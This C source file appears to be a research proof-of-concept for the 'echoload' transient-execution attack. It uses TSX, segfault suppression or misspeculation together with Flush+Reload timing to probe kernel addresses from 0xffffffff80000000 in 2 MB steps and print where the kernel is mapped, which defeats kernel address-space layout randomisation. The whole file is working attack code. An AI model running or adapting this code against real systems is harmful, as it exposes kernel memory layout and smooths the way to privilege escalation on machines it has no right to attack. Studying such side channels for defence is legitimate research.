#include <memory.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sched.h>

#include "cacheutils.h"

#define KERNEL_SIZE 1024 // in MB
#define ALIGNMENT 2 // in MB

#define TSX 0
#define SPECULATION 0

#if SPECULATION
#define speculation_start(label) asm goto ("call %l0" : : : : label##_retp);
#define speculation_end(label) asm goto("jmp %l0" : : : : label); label##_retp: asm goto("lea %l0(%%rip), %%rax\nmovq %%rax, (%%rsp)\nret\n" : : : "rax" : label); label: asm volatile("nop");
#endif

char __attribute__((aligned(4096))) mem[4096 * 256];


int main(void) {
  int t;
  memset(mem, 1, sizeof(mem));

  // Detect the cache miss threshold
  CACHE_MISS = detect_flush_reload_threshold();
  printf("Cache miss @ %zd\n", CACHE_MISS);

  volatile char *buffer = (volatile char*)0xffffffff80000000ull;

  int i;
  for (i = 0; i < 256; i++) {
    flush(mem + i * 4096);
  }

  signal(SIGSEGV, trycatch_segfault_handler);

  //try 1GB of memory, 2MB increments
  int k;
  for (k = 0; k < KERNEL_SIZE/ALIGNMENT; k++) {
    //check each address 5 times
    int r;
    t = 0;
    for (r = 0; r < 5; r++) {
#if TSX == 1 && SPECULATION == 0
      if(try_start()) // use tsx
#elif TSX == 0 && SPECULATION == 0
      sched_yield();
      if (!setjmp(trycatch_buf)) // use segfault handling
#elif TSX == 0 && SPECULATION == 1
      sched_yield();
      speculation_start(s); // use misspeculation
#else
#error Either use TSX, segfault or speculation
#endif
      {
        // start transient execution
        maccess(0);
        maccess(mem + *buffer); // perform echoload attack step
#if TSX == 1 && SPECULATION == 0
        try_abort();
#endif
      }
#if TSX == 1 && SPECULATION == 0
      try_end();
#elif TSX == 0 && SPECULATION == 1
      speculation_end(s);
#elif TSX == 0 && SPECULATION == 0
#else
#error Either use TSX, segfault or speculation
#endif
      // check whether data was cached, if it is we found the kernel
      if (flush_reload(mem)) {
        t++;
        if(t >= 4) {
          printf("%p\n", buffer);
          fflush(stdout);
          goto next;
        }
      }
    }

  next:
    // 2 MB increments
    buffer += 2 * 1024 * 1024;
    fflush(stdout);
  }

  return EXIT_SUCCESS;
}
